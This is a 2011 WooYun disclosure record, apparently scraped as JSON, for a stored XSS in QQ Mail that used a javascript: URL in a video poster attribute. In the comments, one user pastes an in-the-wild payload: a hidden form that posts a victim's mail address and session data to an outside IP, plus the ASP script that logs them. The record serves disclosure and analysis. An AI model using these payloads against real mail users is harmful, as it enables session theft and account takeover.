{"id": 22456, "wybug_id": "wooyun-2011-02351", "wybug_title": "QQ邮箱跨站", "wybug_corp": "腾讯", "wybug_author": "youstar", "wybug_date": "2011-06-30 16:12", "wybug_open_date": "2011-07-30 18:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["富文本策略绕过", "持久型", "浏览器特性"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-30：\t细节向公众公开  简要描述： QQ邮箱存在跨站，没过滤完整呀，只有Opera高版本受影响。 详细说明：  发送如下代码测试即可。\ntest<video poster=javascript:alert(1)//\n只有Opera高版本受影响。   漏洞证明：  \n\n   修复方案：  搞这方面的都懂的，过滤，改下规则。   版权声明：转载请注明来源 youstar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2011-06-30 17:50 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-07-01 13:56 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  又有XSS了.....    \n     2011-07-03 14:32 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  helen 被人中招了<DIV id=abcb_ext1 title=\"<form name='my_form_' method='post' action=' http://210.40.132.155/Setting/a.asp' target='my_frame1_' > <input type='hidden' name='my_data_mail' value='305536777@qq.com'><input type='hidden' name='my_data_exte' value=''></form><iframe id='my_frame1_' height=0 name='my_frame1_' frameborder=0 scrolling=no></iframe> \" style=\"DISPLAY: none\"></DIV><XMP></XMP><STYLE type=text/css>#02 {layout-grid-line:\"</XMP>\"}</STYLE><XMP></XMP></DIV>这个是我们分析的 中招代码接收代码<%Function Format_Time(s_Time, n_Flag)  Dim y, m, d, h, mi, s  Format_Time = \"\"  If IsDate(s_Time) = False Then Exit Function  y = cstr(year(s_Time))  m = cstr(month(s_Time))  If len(m) = 1 Then m = \"0\" & m  d = cstr(day(s_Time))  If len(d) = 1 Then d = \"0\" & d  h = cstr(hour(FormatDateTime(s_Time, 4)))  If len(h) = 1 Then h = \"0\" & h  mi = cstr(minute(s_Time))  If len(mi) = 1 Then mi = \"0\" & mi  s = cstr(second(s_Time))  If len(s) = 1 Then s = \"0\" & s    Select Case n_Flag  Case 0    ' yyyy-mm-dd_hh:mm:ss    Format_Time = y & \"-\" & m & \"-\" & d & \"_\" & h & \":\" & mi & \":\" &s  Case 1    ' yyyy-mm-dd hh:mm:ss    Format_Time = y & \"-\" & m & \"-\" & d & \" \" & h & \":\" & mi & \":\" & s  End SelectEnd Function%><%filename=\"tet.txt\"set fso = Server.CreateObject(\"Scripting.FileSystemObject\")set fout = fso.OpenTextFile(server.mappath(\"\" & filename & \"\"), 8, true)ret1 = Request.Form(\"my_data_mail\")ret2 = Request.Form(\"my_data_exte\")userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")If userip = \"\" Then userip = Request.ServerVariables(\"REMOTE_ADDR\") //IPEnd Ifstr1 = replace(ret1, \"%20\", \"\")str2 = replace(ret2, \";%20\", \";\")if len(str1) > 7 And len(str2) > 20 Thenfout.write Format_Time(now(), 0) & \" \" & str1 & \"(\" & userip & \")*\" & str2 & chr(13) & chr(10)End Ifset fout=nothingset fso=nothing%>my_data_exte  my_data_mail应该是 以前类似QQ空间 key的运用那些人进了helen邮箱想社helen支付宝但是helen有U盾  嘎嘎！    \n     2011-07-13 10:59 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  上面 晴天小铸 你是helen代言人? 整天把他挂在嘴边 真有基情嗯呵    \n     2012-06-05 22:21 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @蚊虫 蚊虫木JJ    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}